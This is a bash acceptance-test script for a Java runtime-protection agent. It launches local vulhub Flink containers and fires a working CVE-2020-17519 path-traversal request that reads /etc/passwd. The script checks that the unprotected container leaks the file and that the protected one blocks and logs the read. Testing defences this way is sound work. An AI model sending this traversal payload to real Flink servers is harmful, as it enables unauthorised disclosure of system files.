#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar

image="${OHMYRASP_VULHUB_FLINK_17519_IMAGE:-vulhub/flink:1.11.2}"
baseline_name="${OHMYRASP_VULHUB_FLINK_17519_BASELINE_NAME:-ohmyrasp-vulhub-flink-17519-baseline}"
protected_name="${OHMYRASP_VULHUB_FLINK_17519_PROTECTED_NAME:-ohmyrasp-vulhub-flink-17519-protected}"
baseline_port="${OHMYRASP_VULHUB_FLINK_17519_BASELINE_PORT:-19110}"
protected_port="${OHMYRASP_VULHUB_FLINK_17519_PROTECTED_PORT:-19111}"
traversal_path="${OHMYRASP_VULHUB_FLINK_17519_PATH:-/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd}"
baseline_dir="logs/vulhub-flink-2020-17519-java8-baseline"
protected_dir="logs/vulhub-flink-2020-17519-java8-protected"
protected_log="${protected_dir}/events.jsonl"

copy_artifacts() {
  local name="$1"
  local dir="$2"
  if docker inspect "$name" >/dev/null 2>&1; then
    docker logs "$name" > "${dir}/container.log" 2>&1 || true
  fi
}

cleanup() {
  copy_artifacts "$baseline_name" "$baseline_dir"
  copy_artifacts "$protected_name" "$protected_dir"
  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

wait_for_flink() {
  local name="$1"
  local port="$2"
  local dir="$3"
  local status
  for attempt in $(seq 1 120); do
    status="$(
      curl -sS -o "${dir}/ready-${attempt}.html" -w "%{http_code}" \
        "http://127.0.0.1:${port}/" 2>/dev/null || true
    )"
    if [[ -z "$status" ]]; then
      status="000"
    fi
    printf 'ready_attempt=%s status=%s\n' "$attempt" "$status" >> "${dir}/attempts.log"
    if [[ "$status" == "200" || "$status" == "302" ]]; then
      return
    fi
    sleep 1
  done
  docker logs "$name" >&2 || true
  echo "Flink did not expose the REST UI at ${port}" >&2
  exit 1
}

wait_for_protected_startup() {
  for attempt in $(seq 1 120); do
    if grep -Fq '"event":"ohmyrasp-java8-agent-start"' "$protected_log"; then
      printf 'agent_start_attempt=%s\n' "$attempt" >> "${protected_dir}/attempts.log"
      return
    fi
    sleep 1
  done
  cat "$protected_log" >&2 || true
  echo "missing Java8 agent startup event for Flink protected container" >&2
  exit 1
}

read_passwd() {
  local port="$1"
  local dir="$2"
  curl -sS -o "${dir}/exploit.response" -w "%{http_code}" \
    "http://127.0.0.1:${port}${traversal_path}" || true
}

run_baseline() {
  local status
  docker run -d --name "$baseline_name" \
    -p "${baseline_port}:8081" \
    "$image" jobmanager >/dev/null

  wait_for_flink "$baseline_name" "$baseline_port" "$baseline_dir"
  status="$(read_passwd "$baseline_port" "$baseline_dir")"
  printf 'exploit_status=%s\n' "$status" >> "${baseline_dir}/attempts.log"
  if grep -Fq "root:" "${baseline_dir}/exploit.response"; then
    copy_artifacts "$baseline_name" "$baseline_dir"
    docker rm -f "$baseline_name" >/dev/null 2>&1 || true
    return
  fi
  cat "${baseline_dir}/exploit.response" >&2 || true
  docker logs "$baseline_name" >&2 || true
  echo "baseline Flink did not disclose /etc/passwd through CVE-2020-17519" >&2
  exit 1
}

run_protected() {
  local status
  docker run -d --name "$protected_name" \
    -p "${protected_port}:8081" \
    -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
    -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
    -e "FLINK_ENV_JAVA_OPTS=-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true" \
    "$image" jobmanager >/dev/null

  wait_for_protected_startup
  wait_for_flink "$protected_name" "$protected_port" "$protected_dir"
  if grep -Fq '"event":"ohmyrasp-detection"' "$protected_log"; then
    cat "$protected_log" >&2
    echo "Flink protected container produced a detection before exploit traffic" >&2
    exit 1
  fi

  status="$(read_passwd "$protected_port" "$protected_dir")"
  printf 'exploit_status=%s\n' "$status" >> "${protected_dir}/attempts.log"
  if grep -Fq "root:" "${protected_dir}/exploit.response"; then
    cat "$protected_log" >&2 || true
    echo "protected Flink disclosed /etc/passwd content" >&2
    exit 1
  fi
  for attempt in $(seq 1 30); do
    printf 'protected_block_attempt=%s\n' "$attempt" >> "${protected_dir}/attempts.log"
    if grep -Eq '"algorithm":"java8_file_sensitive_read".*"action":"block"' "$protected_log"; then
      return
    fi
    sleep 1
  done
  cat "$protected_log" >&2 || true
  cat "${protected_dir}/exploit.response" >&2 || true
  echo "missing java8_file_sensitive_read block event for Flink CVE-2020-17519" >&2
  exit 1
}

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$baseline_dir" "$protected_dir"
chmod 777 "$protected_dir"
: > "$protected_log"
chmod 666 "$protected_log"
docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

run_baseline
run_protected

copy_artifacts "$protected_name" "$protected_dir"
docker rm -f "$protected_name" >/dev/null 2>&1 || true

echo "vulhub Flink CVE-2020-17519 Java8 acceptance passed"
